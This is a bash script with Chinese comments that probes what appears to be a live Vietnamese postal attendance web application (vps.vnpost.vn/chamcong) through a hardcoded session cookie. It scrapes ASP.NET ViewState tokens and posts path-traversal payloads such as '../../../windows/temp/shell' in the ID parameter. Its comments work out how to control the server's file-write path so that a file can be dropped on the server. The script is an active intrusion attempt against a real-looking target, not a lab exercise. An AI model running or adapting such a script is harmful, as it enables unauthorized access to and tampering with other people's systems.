#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "🔥 关键思路：如果能创建C:\TEMP目录，文件就能写入成功"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[*] 原始错误表明：系统尝试写入但目录不存在"
echo "[*] 新策略：尝试让系统创建目录或写入到已存在的目录"
echo ""

# 获取ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" -H "Cookie: $COOKIE")
VIEWSTATE=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VIEWGEN=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EVENTVAL=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# 测试：尝试使用已知存在的Windows目录
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 尝试写入到已存在的系统目录"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Windows常见存在的可写目录
KNOWN_DIRS=(
    "C:\\Windows\\Temp"
    "C:\\Users\\Public"
    "C:\\ProgramData"
    "C:\\inetpub\\logs"
)

# 但问题是：文件名格式是固定的 {月份}{年份}_...
# 我们需要控制整个路径，而不仅仅是月份

# 关键问题：月份参数如何影响最终路径？
echo ""
echo "[*] 关键问题：txtThang参数如何被拼接到路径中？"
echo ""
echo "假设代码是："
echo 'string path = "C:\\TEMP\\" + txtThang + txtNam + "_" + reportCode + "..." ;'
echo ""
echo "如果txtThang= \"C:\\Windows\\Temp\\11\""
echo "最终路径= \"C:\\TEMP\\C:\\Windows\\Temp\\112025_...\""
echo "这不会work..."
echo ""
echo "让我尝试另一个思路：检查其他可能控制路径的参数"
echo ""

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 测试：通过ID参数影响文件路径"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ID=MAU2 → BC01
# 尝试注入路径遍历到ID中

ID_PAYLOADS=(
    "MAU2/../../../windows/temp/shell"
    "../../../windows/temp/test"
    "C:/windows/temp/test"
)

for id in "${ID_PAYLOADS[@]}"; do
    echo -n "  ID=$id: "
    
    # 重新获取ViewState
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "id_path_$(echo $id | md5sum | cut -d' ' -f1).html" 2>&1
    
    filename="id_path_$(echo $id | md5sum | cut -d' ' -f1).html"
    
    # 检查响应
    if grep -qi "Could not find a part of the path" "$filename"; then
        echo "🔥 目录错误!"
        path=$(grep -oE "C:\\[^'\"<>]+" "$filename" | head -1)
        echo "    路径: $path"
    elif [ $(wc -c < "$filename") -gt 6000 ]; then
        echo "⚠️  大响应，检查错误"
        head -100 "$filename" | grep -i "exception\|error" | head -5
    else
        echo "$(wc -c < $filename) bytes"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 总结"
